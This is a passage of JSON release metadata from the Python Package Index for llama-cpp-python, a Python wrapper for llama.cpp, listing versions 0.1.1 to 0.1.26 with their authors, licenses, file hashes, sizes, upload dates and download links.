{"0.1.1":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.1/","requires_dist":null,"requires_python":"","summary":"A Python wrapper for llama.cpp","version":"0.1.1","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"179c813d8c83d81cb9ab42e5ee66657f8d3670bacdcd67df4aa7728e8dccbcfd","md5":"a2afe0aeeb69da9ed3fe5cc8a924525e","sha256":"da7710ca0aa818e3595d332c329c7e1aa75fc51879ab995f25addf2fe27d56a2"},"downloads":-1,"filename":"llama_cpp_python-0.1.1.tar.gz","has_sig":false,"md5_digest":"a2afe0aeeb69da9ed3fe5cc8a924525e","packagetype":"sdist","python_version":"source","requires_python":null,"size":341285,"upload_time":"2023-03-23T18:20:56","upload_time_iso_8601":"2023-03-23T18:20:56.467490Z","url":"https://files.pythonhosted.org/packages/17/9c/813d8c83d81cb9ab42e5ee66657f8d3670bacdcd67df4aa7728e8dccbcfd/llama_cpp_python-0.1.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.10":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.10/","requires_dist":null,"requires_python":"","summary":"A Python wrapper for llama.cpp","version":"0.1.10","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"71ade3f373300efdfbcd67dc3909512a5b80dd6c5f2092102cbea66bad75ec4d","md5":"d46f8d4b934c46418c9daeafad89f48d","sha256":"38dfe7697ccfa2d506ca4b0cd120edd491d5b8129d9cf8706d767daea8a3f31e"},"downloads":-1,"filename":"llama_cpp_python-0.1.10.tar.gz","has_sig":false,"md5_digest":"d46f8d4b934c46418c9daeafad89f48d","packagetype":"sdist","python_version":"source","requires_python":null,"size":518096,"upload_time":"2023-03-29T01:11:12","upload_time_iso_8601":"2023-03-29T01:11:12.037481Z","url":"https://files.pythonhosted.org/packages/71/ad/e3f373300efdfbcd67dc3909512a5b80dd6c5f2092102cbea66bad75ec4d/llama_cpp_python-0.1.10.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.11":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.11/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.11","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"bb5ec15d23176dd5783b1f62fd1b89c38fa655c9c1b524451e34a240fabffca8","md5":"e09d4350a9565be44c65ac97a064eefe","sha256":"007aa9b7d272f7fdaa897f2b2ba757ed213b11088f5a246a1e429a43795aac4e"},"downloads":-1,"filename":"llama_cpp_python-0.1.11.tar.gz","has_sig":false,"md5_digest":"e09d4350a9565be44c65ac97a064eefe","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":520617,"upload_time":"2023-04-01T17:06:22","upload_time_iso_8601":"2023-04-01T17:06:22.690990Z","url":"https://files.pythonhosted.org/packages/bb/5e/c15d23176dd5783b1f62fd1b89c38fa655c9c1b524451e34a240fabffca8/llama_cpp_python-0.1.11.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.12":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.12/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.12","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"ad6191b0c968596bcca9b09c6e40a38852500d31ed5f8649e25cfab293dc9af0","md5":"ac90a5f64df0e658d7ec7ac612604dd1","sha256":"952ee06c0611dd8135cff5b5cee4b70b071ba7c9dde2f7ec2fafc061b042fcb8"},"downloads":-1,"filename":"llama_cpp_python-0.1.12.tar.gz","has_sig":false,"md5_digest":"ac90a5f64df0e658d7ec7ac612604dd1","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":520685,"upload_time":"2023-04-01T21:31:08","upload_time_iso_8601":"2023-04-01T21:31:08.145385Z","url":"https://files.pythonhosted.org/packages/ad/61/91b0c968596bcca9b09c6e40a38852500d31ed5f8649e25cfab293dc9af0/llama_cpp_python-0.1.12.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.13":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.13/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.13","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"638f1bb0a901a1be8c243e741a17ece1588615a1c5c4b9578ce80f12ce809d14","md5":"5f8f79540c2934895080ca480bf8be94","sha256":"038cc2ad332a16bc85c4e5d8231bee28143c018179e1bb540c0eb81a4a0ea411"},"downloads":-1,"filename":"llama_cpp_python-0.1.13.tar.gz","has_sig":false,"md5_digest":"5f8f79540c2934895080ca480bf8be94","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":520791,"upload_time":"2023-04-01T21:37:17","upload_time_iso_8601":"2023-04-01T21:37:17.123699Z","url":"https://files.pythonhosted.org/packages/63/8f/1bb0a901a1be8c243e741a17ece1588615a1c5c4b9578ce80f12ce809d14/llama_cpp_python-0.1.13.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.14":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.14/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.14","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"25bc83364cb8c3fff7da82fadd10e0d1ec221278a5403ab4222dd0745bfa6709","md5":"bcbf8989a8f9d0c1d363a5ede3b9711f","sha256":"93ab0f4cfa1790e8f1ed749eb029766a5f829939b72f37c4a6dbc16b14daae33"},"downloads":-1,"filename":"llama_cpp_python-0.1.14.tar.gz","has_sig":false,"md5_digest":"bcbf8989a8f9d0c1d363a5ede3b9711f","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":520955,"upload_time":"2023-04-02T04:13:00","upload_time_iso_8601":"2023-04-02T04:13:00.157216Z","url":"https://files.pythonhosted.org/packages/25/bc/83364cb8c3fff7da82fadd10e0d1ec221278a5403ab4222dd0745bfa6709/llama_cpp_python-0.1.14.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.15":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.15/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.15","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"d86b0b89436a26c2a7a5e1b57809d6f692c4f0afd87b19c31fe5425ddb19f54b","md5":"f7d25142438089d1a4a8c8b76f39b3a6","sha256":"6157479ed75799c8cbda5bc2644ba26f79badc07223eaf8f4ecafe70d0b13909"},"downloads":-1,"filename":"llama_cpp_python-0.1.15.tar.gz","has_sig":false,"md5_digest":"f7d25142438089d1a4a8c8b76f39b3a6","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":520999,"upload_time":"2023-04-02T08:00:23","upload_time_iso_8601":"2023-04-02T08:00:23.003467Z","url":"https://files.pythonhosted.org/packages/d8/6b/0b89436a26c2a7a5e1b57809d6f692c4f0afd87b19c31fe5425ddb19f54b/llama_cpp_python-0.1.15.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.16":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.16/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.16","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"7fefaa0d2e4ef92173bf7e3539b5fa3338e7f9f88a66e7a90cb2f00052b7a9cb","md5":"0857e324e22247ecafaf635e02d968ef","sha256":"ebd97320819c07915c2ebaa031d43f12554276bafb6d0c82741cff833ff36fec"},"downloads":-1,"filename":"llama_cpp_python-0.1.16.tar.gz","has_sig":false,"md5_digest":"0857e324e22247ecafaf635e02d968ef","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":522207,"upload_time":"2023-04-02T17:36:36","upload_time_iso_8601":"2023-04-02T17:36:36.664603Z","url":"https://files.pythonhosted.org/packages/7f/ef/aa0d2e4ef92173bf7e3539b5fa3338e7f9f88a66e7a90cb2f00052b7a9cb/llama_cpp_python-0.1.16.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.17":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.17/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.17","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"71d6bb0a4bb92abf16dee92a933b45ba16f0e6c0a1b63ee8877c678a54c373a8","md5":"25cdad62ef6fc2d23130394d1374302d","sha256":"f8fa884d058688e45239d6c753328e9bb8e804e9224f668d58ef993be460004e"},"downloads":-1,"filename":"llama_cpp_python-0.1.17.tar.gz","has_sig":false,"md5_digest":"25cdad62ef6fc2d23130394d1374302d","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":524410,"upload_time":"2023-04-03T18:49:49","upload_time_iso_8601":"2023-04-03T18:49:49.656251Z","url":"https://files.pythonhosted.org/packages/71/d6/bb0a4bb92abf16dee92a933b45ba16f0e6c0a1b63ee8877c678a54c373a8/llama_cpp_python-0.1.17.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.18":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.18/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.18","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"c2087c12856cbe4523e518e280914674f4b65f5f62076408a7984b69d9771494","md5":"8b4d9144de66d845cf25b6e33a6816e6","sha256":"286229b28f9dd91b75ddd9ac02a0c7d94cb8044a2025e9d5be0d6d4d76021e83"},"downloads":-1,"filename":"llama_cpp_python-0.1.18.tar.gz","has_sig":false,"md5_digest":"8b4d9144de66d845cf25b6e33a6816e6","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":524450,"upload_time":"2023-04-03T22:47:17","upload_time_iso_8601":"2023-04-03T22:47:17.895181Z","url":"https://files.pythonhosted.org/packages/c2/08/7c12856cbe4523e518e280914674f4b65f5f62076408a7984b69d9771494/llama_cpp_python-0.1.18.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.19":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.19/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.19","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"6348977cd0ffdbfb9446e758c8c69aa49025a7477058d42bd30bef67f42c556c","md5":"9e0c21d39473b484627d66ac9cf2dcad","sha256":"9b0ca00bfdc82cb90f49cacfe2453b81838ea284046221adfbf9942347535ce8"},"downloads":-1,"filename":"llama_cpp_python-0.1.19.tar.gz","has_sig":false,"md5_digest":"9e0c21d39473b484627d66ac9cf2dcad","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":525229,"upload_time":"2023-04-04T00:14:15","upload_time_iso_8601":"2023-04-04T00:14:15.297931Z","url":"https://files.pythonhosted.org/packages/63/48/977cd0ffdbfb9446e758c8c69aa49025a7477058d42bd30bef67f42c556c/llama_cpp_python-0.1.19.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.2":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.2/","requires_dist":null,"requires_python":"","summary":"A Python wrapper for llama.cpp","version":"0.1.2","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"422207711b8fc85ed188182c923aa424254a451ee23a58d6c45a033e05e57f9a","md5":"c55a17056f2b28ab46a165eeb4100535","sha256":"08fafca2a755f70de56482d1851d6cdcd2c69156296f54c7262f48ef728b90be"},"downloads":-1,"filename":"llama_cpp_python-0.1.2.tar.gz","has_sig":false,"md5_digest":"c55a17056f2b28ab46a165eeb4100535","packagetype":"sdist","python_version":"source","requires_python":null,"size":518363,"upload_time":"2023-03-24T03:13:49","upload_time_iso_8601":"2023-03-24T03:13:49.792166Z","url":"https://files.pythonhosted.org/packages/42/22/07711b8fc85ed188182c923aa424254a451ee23a58d6c45a033e05e57f9a/llama_cpp_python-0.1.2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.20":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.20/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.20","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"dc2e730cc405e0227ce6f49dd2bab4d6ce69963cb65bc3452fd33a552c9b8630","md5":"201df4f9df201ea1ffd70bcdbf40e458","sha256":"717a8fa3261029a7c3507fd12bffb218a08740e7f8c83ef041aae20c2c5a330c"},"downloads":-1,"filename":"llama_cpp_python-0.1.20.tar.gz","has_sig":false,"md5_digest":"201df4f9df201ea1ffd70bcdbf40e458","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":525508,"upload_time":"2023-04-04T21:18:07","upload_time_iso_8601":"2023-04-04T21:18:07.828315Z","url":"https://files.pythonhosted.org/packages/dc/2e/730cc405e0227ce6f49dd2bab4d6ce69963cb65bc3452fd33a552c9b8630/llama_cpp_python-0.1.20.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.21":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.21/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.21","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"521ad122abc9571e09e17ad8909d2f8710ea0abe26ced1287ae82828fc80aaa3","md5":"a1d4a0368d3af0b2040a9df9b07e50ac","sha256":"53dc812c42d14666e5c3e1d0642ded1a6107f561b8a1dbd4f540ec0dc8a9cbfe"},"downloads":-1,"filename":"llama_cpp_python-0.1.21.tar.gz","has_sig":false,"md5_digest":"a1d4a0368d3af0b2040a9df9b07e50ac","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":526900,"upload_time":"2023-04-05T08:45:34","upload_time_iso_8601":"2023-04-05T08:45:34.388111Z","url":"https://files.pythonhosted.org/packages/52/1a/d122abc9571e09e17ad8909d2f8710ea0abe26ced1287ae82828fc80aaa3/llama_cpp_python-0.1.21.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.22":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.22/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.22","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"cf944c35d7e3011ce86f063e3c754afd71f3a6f1f2a0ec9616deb55e8f3743a1","md5":"0d0c66053c29f6ee5e6ba48b42415092","sha256":"5e40c5d1de9384b9d5efd81d79c0d1287583cb270bf87c9dc071a8aa06c11e42"},"downloads":-1,"filename":"llama_cpp_python-0.1.22.tar.gz","has_sig":false,"md5_digest":"0d0c66053c29f6ee5e6ba48b42415092","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":527189,"upload_time":"2023-04-05T10:54:12","upload_time_iso_8601":"2023-04-05T10:54:12.122104Z","url":"https://files.pythonhosted.org/packages/cf/94/4c35d7e3011ce86f063e3c754afd71f3a6f1f2a0ec9616deb55e8f3743a1/llama_cpp_python-0.1.22.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.23":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.23/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.23","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"036e3e0768c396be6807b9e835c223ce37385d574eaf9e4d0ac80116325f6775","md5":"d60f5bd44acde0776c090eb957aa8772","sha256":"323a937e68e04251b5ad1804922e05d15c8b6bfbcf7c3e683a7b39a20e165ebf"},"downloads":-1,"filename":"llama_cpp_python-0.1.23.tar.gz","has_sig":false,"md5_digest":"d60f5bd44acde0776c090eb957aa8772","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":530022,"upload_time":"2023-04-05T20:27:42","upload_time_iso_8601":"2023-04-05T20:27:42.780522Z","url":"https://files.pythonhosted.org/packages/03/6e/3e0768c396be6807b9e835c223ce37385d574eaf9e4d0ac80116325f6775/llama_cpp_python-0.1.23.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.24":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.24/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.24","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"bc8b618c42fdfa078a3cec9ed871b9c1bb6cca65b66e4e3ce0bf690f8109eaa1","md5":"7e342a8870c6ecc4c5e18c67379e0f38","sha256":"f4ad0896c8dbaad1de7a01f3cde773b0fe7e173c545ec4c38cd8e9b3f1e30fd5"},"downloads":-1,"filename":"llama_cpp_python-0.1.24.tar.gz","has_sig":false,"md5_digest":"7e342a8870c6ecc4c5e18c67379e0f38","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":530643,"upload_time":"2023-04-07T01:20:22","upload_time_iso_8601":"2023-04-07T01:20:22.670415Z","url":"https://files.pythonhosted.org/packages/bc/8b/618c42fdfa078a3cec9ed871b9c1bb6cca65b66e4e3ce0bf690f8109eaa1/llama_cpp_python-0.1.24.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.25":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.25/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.25","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"6c64bd9d98588aa8b6c49c0cfa1d0b4ef4ec5a1a05e4d8d67c1aed3587ae2e1a","md5":"a9da92ff20d4603b5820860054b88f1d","sha256":"74f24aaf87c81ceddf93b9e2a5d4f455c97d00c489e4cbd9a641622e4d29e15f"},"downloads":-1,"filename":"llama_cpp_python-0.1.25.tar.gz","has_sig":false,"md5_digest":"a9da92ff20d4603b5820860054b88f1d","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":530651,"upload_time":"2023-04-07T02:49:24","upload_time_iso_8601":"2023-04-07T02:49:24.795548Z","url":"https://files.pythonhosted.org/packages/6c/64/bd9d98588aa8b6c49c0cfa1d0b4ef4ec5a1a05e4d8d67c1aed3587ae2e1a/llama_cpp_python-0.1.25.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.26":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.26/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for 